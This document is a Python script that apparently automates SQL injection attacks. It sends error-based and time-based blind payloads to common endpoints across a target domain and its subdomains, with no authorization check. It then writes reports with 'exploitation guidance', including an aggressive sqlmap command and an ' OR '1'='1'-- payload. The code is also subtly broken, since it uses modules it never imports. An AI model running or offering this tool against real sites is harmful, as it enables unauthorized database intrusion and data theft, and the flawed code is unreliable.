#!/usr/bin/env python3
import requests
import urllib.parse
import concurrent.futures
import os
import time
from datetime import datetime

class SQLiScanner:
    def __init__(self):
        self.results_file = "sqli_scan_results.txt"
        self.payloads = []
        self.subdomains = []
        self.vulnerabilities = []
        self.COMMON_ENDPOINTS = [
            "/admin/login.php?id=1",
            "/search.php?q=test",
            "/product.php?id=1",
            "/user.php?id=1",
            "/profile.php?user=1",
            "/index.php?page_id=1",
            "/cart.php?item_id=1",
            "/view.php?id=1"
        ]
        
    def load_payloads(self, file_path):
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                self.payloads = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Error loading payloads: {e}")
            sys.exit(1)
    
    def load_subdomains(self, file_path):
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                self.subdomains = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Error loading subdomains: {e}")
            sys.exit(1)
    
    def generate_test_urls(self, base_domain):
        """Generate test URLs with common vulnerable endpoints"""
        test_urls = []
        for endpoint in self.COMMON_ENDPOINTS:
            test_urls.append(f"http://{base_domain}{endpoint}")
            test_urls.append(f"https://{base_domain}{endpoint}")
        return test_urls
    
    def scan_url(self, url):
        """Test a single URL for SQL injection vulnerabilities"""
        print(f"[*] Testing: {url}")
        parsed = urllib.parse.urlparse(url)
        
        if not parsed.query:
            return []
        
        params = urllib.parse.parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        found_vulns = []
        
        for param in params:
            for payload in self.payloads:
                # Test GET requests
                test_params = params.copy()
                test_params[param] = payload
                try:
                    response = requests.get(
                        base_url,
                        params=test_params,
                        headers={'User-Agent': 'SQLiScanner/1.0'},
                        timeout=15,
                        verify=False
                    )
                    if self.is_vulnerable(response):
                        found_vulns.append({
                            'type': 'GET',
                            'url': response.url,
                            'param': param,
                            'payload': payload,
                            'response': self.safe_truncate(response.text),
                            'evidence': self.extract_evidence(response.text)
                        })
                except Exception as e:
                    continue
                
                # Test POST requests
                try:
                    response = requests.post(
                        base_url,
                        data={param: payload},
                        headers={'User-Agent': 'SQLiScanner/1.0'},
                        timeout=15,
                        verify=False
                    )
                    if self.is_vulnerable(response):
                        found_vulns.append({
                            'type': 'POST',
                            'url': base_url,
                            'param': param,
                            'payload': payload,
                            'response': self.safe_truncate(response.text),
                            'evidence': self.extract_evidence(response.text)
                        })
                except Exception as e:
                    continue
                
                # Test time-based blind SQLi
                try:
                    start_time = time.time()
                    test_payload = f"1 AND SLEEP(5)"
                    requests.get(
                        base_url,
                        params={param: test_payload},
                        timeout=10,
                        verify=False
                    )
                    if time.time() - start_time >= 5:
                        found_vulns.append({
                            'type': 'Time-Based Blind',
                            'url': base_url,
                            'param': param,
                            'payload': test_payload,
                            'response': "Time delay detected",
                            'evidence': "5+ second response delay"
                        })
                except:
                    continue
        
        return found_vulns
    
    def is_vulnerable(self, response):
        """Check if response indicates SQL injection vulnerability"""
        sql_errors = [
            "SQL syntax", "MySQL server", "syntax error",
            "unclosed quotation", "quoted string", "pg_query()",
            "mysql_fetch", "ORA-", "Microsoft OLE DB", "ODBC Driver",
            "PostgreSQL", "SQLite3", "Warning:", "mysql_num_rows",
            "mysqli_", "SQL command", "PDOException", "SQL Server",
            "unexpected end", "quoted string not properly terminated"
        ]
        return any(error.lower() in response.text.lower() for error in sql_errors)
    
    def extract_evidence(self, response_text):
        """Extract relevant error messages from response"""
        error_patterns = [
            r"SQL.*error[^<]*",
            r"Warning.*[^<]*",
            r"Syntax.*error[^<]*",
            r"MySQL.*error[^<]*"
        ]
        
        for pattern in error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)[:200] + "..." if len(match.group(0)) > 200 else match.group(0)
        return "No specific error message captured"
    
    def safe_truncate(self, text, length=500):
        """Safely truncate response text"""
        return text[:length] + "..." if len(text) > length else text
    
    def generate_report(self):
        """Generate comprehensive vulnerability report"""
        with open(self.results_file, 'w', encoding='utf-8') as f:
            f.write(f"SQL Injection Scan Report - {datetime.now()}\n")
            f.write("="*70 + "\n\n")
            f.write(f"Scanned {len(self.subdomains)} subdomains with {len(self.payloads)} payloads\n")
            f.write(f"Found {len(self.vulnerabilities)} potential vulnerabilities\n\n")
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                f.write(f"Vulnerability #{i}\n")
                f.write(f"Type: {vuln['type']} SQL Injection\n")
                f.write(f"URL: {vuln['url']}\n")
                f.write(f"Parameter: {vuln['param']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"\nEvidence:\n{vuln['evidence']}\n")
                
                f.write("\nExploitation Guidance:\n")
                f.write(f"1. Parameter '{vuln['param']}' is vulnerable to {vuln['type']} SQLi\n")
                f.write(f"2. Verify with sqlmap: sqlmap -u '{vuln['url']}' -p {vuln['param']} --risk=3 --level=5\n")
                
                if vuln['type'] == 'Time-Based Blind':
                    f.write("3. This is a blind SQLi - use time-based techniques for exploitation\n")
                else:
                    f.write("3. Try appending: ' OR '1'='1'-- to exploit\n")
                
                f.write(f"\nSample Response:\n{vuln['response']}\n")
                f.write("="*70 + "\n\n")
    
    def run_scan(self):
        """Main scanning workflow"""
        print("=== Advanced SQL Injection Scanner ===")
        print("Note: This scanner tests for error-based and time-based SQL injection\n")
        
        target = input("Enter target domain (e.g., example.com): ").strip()
        if not target:
            print("[!] Target domain is required")
            return
        
        if input("Do you have subdomains file? (y/n): ").lower() == 'y':
            sub_file = input("Enter subdomains file path: ").strip()
            if not os.path.exists(sub_file):
                print("[!] Subdomains file not found")
                return
            self.load_subdomains(sub_file)
            
            targets = []
            for sub in self.subdomains:
                targets.extend(self.generate_test_urls(f"{sub}.{target}"))
            targets.extend(self.generate_test_urls(target))
        else:
            targets = self.generate_test_urls(target)
        
        payload_file = input("Enter payloads file path: ").strip()
        if not os.path.exists(payload_file):
            print("[!] Payloads file not found")
            return
        self.load_payloads(payload_file)
        
        print(f"\n[+] Starting scan on {len(targets)} targets with {len(self.payloads)} payloads...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
            futures = {executor.submit(self.scan_url, target): target for target in targets}
            for future in concurrent.futures.as_completed(futures):
                try:
                    results = future.result()
                    self.vulnerabilities.extend(results)
                except Exception as e:
                    print(f"[!] Error scanning: {e}")
        
        self.generate_report()
        print(f"\n[+] Scan complete! Results saved to {self.results_file}")
        print(f"[+] Found {len(self.vulnerabilities)} potential vulnerabilities")

if __name__ == "__main__":
    scanner = SQLiScanner()
    scanner.run_scan()
